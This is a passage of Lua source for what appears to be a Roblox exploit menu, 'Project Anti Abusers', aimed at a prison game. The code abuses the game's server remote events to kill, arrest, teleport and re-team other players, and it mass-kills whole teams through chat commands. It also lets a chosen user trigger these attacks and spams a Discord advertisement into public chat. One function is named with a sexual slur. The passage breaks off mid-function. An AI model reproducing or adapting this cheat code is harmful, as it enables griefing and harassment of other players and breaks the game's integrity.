ProjectAntiAbusers.UICorner_93.Parent = ProjectAntiAbusers.saverespawn

ProjectAntiAbusers.infzoomout.Name = "infzoomout"
ProjectAntiAbusers.infzoomout.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.infzoomout.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.infzoomout.Position = UDim2.new(0.511278212, 0, 0.190677911, 0)
ProjectAntiAbusers.infzoomout.Size = UDim2.new(0, 179, 0, 32)
ProjectAntiAbusers.infzoomout.Font = Enum.Font.SourceSans
ProjectAntiAbusers.infzoomout.Text = "Infinitely Zoom Out"
ProjectAntiAbusers.infzoomout.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.infzoomout.TextSize = 15.000

ProjectAntiAbusers.UICorner_94.Parent = ProjectAntiAbusers.infzoomout

ProjectAntiAbusers.btools.Name = "btools"
ProjectAntiAbusers.btools.Parent = ProjectAntiAbusers.LocalFunctionsFrame
ProjectAntiAbusers.btools.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.btools.Position = UDim2.new(0.263157904, 0, 0.838982999, 0)
ProjectAntiAbusers.btools.Size = UDim2.new(0, 90, 0, 32)
ProjectAntiAbusers.btools.Font = Enum.Font.SourceSans
ProjectAntiAbusers.btools.Text = "Btools"
ProjectAntiAbusers.btools.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.btools.TextSize = 15.000

ProjectAntiAbusers.UICorner_95.Parent = ProjectAntiAbusers.btools

-- Scripts:

local function TDAQFTQ_fake_script() -- ProjectAntiAbusers.MakeUserAdmin.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.MakeUserAdmin)
	script.Parent.MouseButton1Click:connect(function()
		target = FindPlayer(script.Parent.Parent.AdminUsernameTextBox.Text)
		
		local function FindTarget(name)
			name = name:lower()
			for k,v in pairs(game.Players:GetPlayers()) do
				if v.Name:lower():sub(1,#name) == name then
					return v
				end
			end
		end
		
		target.Chatted:connect(function(msg)
			if msg:sub(1,6) == ".kill " then
				v = FindTarget(msg:sub(7))
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				rape(v)
			elseif msg:sub(1,8) == ".arrest " then
				v = FindTarget(msg:sub(9))
				saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
				wait(0.2)
				workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
				wait(0.2)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			elseif msg:sub(1,8) == ".userid " then
				v = FindTarget(msg:sub(9))
				tbl = {
					v.Name.."'s Userid is "..v.UserId,
					"All"
				}
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
			elseif msg:sub(1,5) == ".age " then
				v = FindTarget(msg:sub(6))
				tbl = {
					v.Name.."'s account age is "..v.AccountAge.." days old",
					"All"
				}
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
			elseif msg:sub(1,6) == ".crim " then
				v = FindTarget(msg:sub(7))
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
				wait(0.2)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				if v and v.Character then
					saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					game.Players.LocalPlayer.Character.Humanoid.Sit = false
					for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
						if Z.Name == "Remington 870" then
							workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
						end
					end
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
					game.Players.LocalPlayer.Character.Humanoid.Name = 1
					cl = game.Players.LocalPlayer.Character["1"]:Clone()
					cl.Parent = game.Players.LocalPlayer.Character
					cl.Name = "Humanoid"
					wait()
					game.Players.LocalPlayer.Character["1"]:Destroy()
					game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
					game.Players.LocalPlayer.Character.Animate.Disabled = true
				end
				game.Players.LocalPlayer.Character.Animate.Disabled = false
				game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					if v.Name == "Remington 870" then
						game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
					end
				end
				v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
				wait(0.3)
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			elseif msg:sub(1,6) == ".trap " then
				v = FindTarget(msg:sub(7))
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-306.426514, 54.2398338, 1982.18201, 0.812489867, -4.78796665e-08, 0.582975328, 7.8811361e-08, 1, -2.77091701e-08, -0.582975328, 6.84584975e-08, 0.812489867)
				wait(0.2)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				if v and v.Character then
					saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					game.Players.LocalPlayer.Character.Humanoid.Sit = false
					for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
						if Z.Name == "Remington 870" then
							workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
						end
					end
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
					game.Players.LocalPlayer.Character.Humanoid.Name = 1
					cl = game.Players.LocalPlayer.Character["1"]:Clone()
					cl.Parent = game.Players.LocalPlayer.Character
					cl.Name = "Humanoid"
					wait()
					game.Players.LocalPlayer.Character["1"]:Destroy()
					game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
					game.Players.LocalPlayer.Character.Animate.Disabled = true
				end
				game.Players.LocalPlayer.Character.Animate.Disabled = false
				game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					if v.Name == "Remington 870" then
						game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
					end
				end
				v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
				wait(0.3)
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			elseif msg:sub(1,6) == ".void " then
				v = FindTarget(msg:sub(7))
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327)
				wait(0.2)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				if v and v.Character then
					game.Players.LocalPlayer.Character.Humanoid.Sit = false
					for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
						if Z.Name == "Remington 870" then
							workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
						end
					end
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
					game.Players.LocalPlayer.Character.Humanoid.Name = 1
					cl = game.Players.LocalPlayer.Character["1"]:Clone()
					cl.Parent = game.Players.LocalPlayer.Character
					cl.Name = "Humanoid"
					wait()
					game.Players.LocalPlayer.Character["1"]:Destroy()
					game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
					game.Players.LocalPlayer.Character.Animate.Disabled = true
				end
				game.Players.LocalPlayer.Character.Animate.Disabled = false
				game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					if v.Name == "Remington 870" then
						game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
					end
				end
				v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
				wait(0.3)
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			elseif msg:sub(1,8) == ".killall" then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) and v.Name ~= target.Name then
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						i = 1
						repeat
							i = i-1
						rape(v)
						until i == 0
					end
				end
			elseif msg:sub(1,6) == ".kcops" then
				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
					if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						i = 1
						repeat
							i = i-1
						rape(v)
						until i == 0
					end
				end
			elseif msg:sub(1,6) == ".kpris" then
				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
					if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						i = 1
						repeat
							i = i-1
						rape(v)
						until i == 0
					end
				end
			elseif msg:sub(1,7) == ".kskids" then
				for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
					if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						i = 1
						repeat
							i = i-1
						rape(v)
						until i == 0
					end
				end
			elseif msg:sub(1,7) == ".kcrims" then
				for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
					if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= target.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						i = 1
						repeat
							i = i-1
						rape(v)
						until i == 0
					end
				end
			elseif msg:sub(1,3) == ".ad" then
				tbl = {
					"I am a proud user of Project Anti Abusers! want to check it out? discycord invite code is CWSsGEm",
					"All"
				}
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
			elseif msg:sub(1,6) == ".using" then
				tbl = {
					"I am a proud user of Project Anti Abusers! want to check it out? discycord invite code is CWSsGEm",
					"All"
				}
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
			elseif msg:sub(1,5) == ".cmds" then
				tbl = {
					"usable commands are: .kill PLR|.arrest PLR|.userid PLR | .age PLR|.crim PLR|.trap PLR|.void PLR|.killall|.kcops|.kpris|.kcrims|.kskids|.ad|.using",
					"All"
				}
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
			elseif msg:sub(1,7) == ".acrims" then
				i = 3
				repeat
					i = i-1
					for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
						if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
							wait(0.2)
							workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
							wait(0.5)
							for i = 1,15 do
								game.ReplicatedStorage.meleeEvent:FireServer(v)
							end
						end
					end
				until i == 0
			end
		end)
	end)
end
    
coroutine.wrap(TDAQFTQ_fake_script)()
local function VDYSBSF_fake_script() -- ProjectAntiAbusers.SayCommands.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.SayCommands)
	script.Parent.MouseButton1Click:connect(function()
		tbl = {
			"usable commands are: .kill PLR|.arrest PLR|.userid PLR | .age PLR|.crim PLR|.trap PLR|.void PLR|.killall|.kcops|.kpris|.kcrims|.kskids|.ad|.using",
			"All"
		}
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl))
	end)	
end
coroutine.wrap(VDYSBSF_fake_script)()
local function EJVI_fake_script() -- ProjectAntiAbusers.ExtraPermStuff.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.ExtraPermStuff)

	script.Parent.MouseButton1Click:connect(function()
		Type("You don't have access to this!")
	end)
end
coroutine.wrap(EJVI_fake_script)()
local function YMSTRIL_fake_script() -- ProjectAntiAbusers.makeallcrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.makeallcrim)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
					wait(0.2)
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Made all inmates criminals")
	end)
end
coroutine.wrap(YMSTRIL_fake_script)()
local function HBSBCAJ_fake_script() -- ProjectAntiAbusers.killallguards.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.killallguards)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
					wait(0.2)
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
					wait(0.1)
					workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
					wait(0.1)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
				until i == 0
			end
		end
		Type("Wiped all cops")
	end)
end
coroutine.wrap(HBSBCAJ_fake_script)()
local function OVNZHS_fake_script() -- ProjectAntiAbusers.makeguardcrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.makeguardcrim)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
					wait(0.2)
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Made all cops criminals")
	end)
end

coroutine.wrap(OVNZHS_fake_script)()
local function WRDGAB_fake_script() -- ProjectAntiAbusers.makeinmatecrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.makeinmatecrim)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
					wait(0.2)
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Made all inmates criminals")
	end)
end
coroutine.wrap(WRDGAB_fake_script)()
local function IGXVDY_fake_script() -- ProjectAntiAbusers.makeneutralcrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.makeneutralcrim)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-919.626892, 95.3272018, 2138.00024, -0.0678398162, 2.80227876e-08, -0.997696221, 3.68113859e-08, 1, 2.55844501e-08, 0.997696221, -3.49909364e-08, -0.0678398162)
					wait(0.2)
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Made all inmates criminals")
	end)
end
coroutine.wrap(IGXVDY_fake_script)()
local function WCZYEN_fake_script() -- ProjectAntiAbusers.BringCopTeam.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.BringCopTeam)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Brought all cops")
	end)
end
coroutine.wrap(WCZYEN_fake_script)()
local function KKAIJ_fake_script() -- ProjectAntiAbusers.Bringinmate.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Bringinmate)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
						if v.Name == "Remington 870" then
							game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
						end
					end
					v.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					wait(0.3)
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				until i == 0
			end
		end
		Type("Brought all Inmates")
	end)
end
coroutine.wrap(KKAIJ_fake_script)()
local function VPCNIZF_fake_script() -- ProjectAntiAbusers.Bringcrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Bringcrim)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 2
				repeat
					i = i-1
					if v and v.Character then
						saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
						game.Players.LocalPlayer.Character.Humanoid.Sit = false
						for Y,Z in pairs(workspace.Prison_ITEMS.giver:GetChildren()) do
							if Z.Name == "Remington 870" then
								workspace.Remote.ItemHandler:InvokeServer(Z.ITEMPICKUP)
							end
						end
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
						game.Players.LocalPlayer.Character.Humanoid.Name = 1
						cl = game.Players.LocalPlayer.Character["1"]:Clone()
						cl.Parent = game.Players.LocalPlayer.Character
						cl.Name = "Humanoid"
						wait()
						game.Players.LocalPlayer.Character["1"]:Destroy()
						game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
						game.Players.LocalPlayer.Character.Animate.Disabled = true
					end
					game.Players.LocalPlayer.Character.Animate.Disabled = false
